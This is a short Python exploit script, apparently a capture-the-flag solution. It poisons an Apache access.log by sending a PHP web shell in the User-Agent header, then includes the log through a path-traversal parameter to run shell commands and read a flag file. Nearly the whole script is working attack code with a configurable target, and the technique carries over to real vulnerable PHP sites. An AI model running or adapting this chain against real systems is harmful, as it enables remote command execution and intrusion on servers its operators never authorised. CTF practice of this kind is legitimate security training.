#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
19-lfi-log-poisoning
LFI + Apache access.log poisoning get flag.

Usage:
  python3 main.py
  python3 main.py http://47.120.76.57:34100/
"""

import re
import sys
import time
import requests
from urllib.parse import urljoin

TARGET = sys.argv[1].rstrip('/') + '/' if len(sys.argv) > 1 else 'http://47.120.76.57:34100/'
FLAG_RE = re.compile(r'TOGOGO-flag\{[^}]+\}')


def poison_log(session: requests.Session) -> None:
    """Write PHP code into Apache access.log via User-Agent."""
    php_payload = "<?php echo 'LFI_RCE_MARKER_9b7'; system($_GET['c'] ?? 'id'); ?>"
    headers = {
        'User-Agent': php_payload,
    }
    # 404 is fine; Apache still records the User-Agent in access.log.
    url = urljoin(TARGET, 'poison-' + str(int(time.time())))
    session.get(url, headers=headers, timeout=8)


def include_log_and_run(session: requests.Session, cmd: str) -> str:
    """Include poisoned access.log and pass command through c parameter."""
    params = {
        'page': '../../../../var/log/apache2/access.log',
        'c': cmd,
    }
    r = session.get(TARGET, params=params, timeout=12)
    r.raise_for_status()
    return r.text


def main() -> None:
    s = requests.Session()
    print(f'[*] target: {TARGET}')

    print('[*] poisoning Apache access.log via User-Agent ...')
    poison_log(s)
    time.sleep(0.3)

    print('[*] triggering LFI include and reading /flag ...')
    body = include_log_and_run(s, 'cat /flag')

    m = FLAG_RE.search(body)
    if m:
        print('[+] flag found:')
        print(m.group(0))
        return

    print('[-] flag not found, showing marker context if available:')
    idx = body.find('LFI_RCE_MARKER_9b7')
    if idx != -1:
        print(body[max(0, idx - 200): idx + 500])
    else:
        print(body[:1000])


if __name__ == '__main__':
    main()
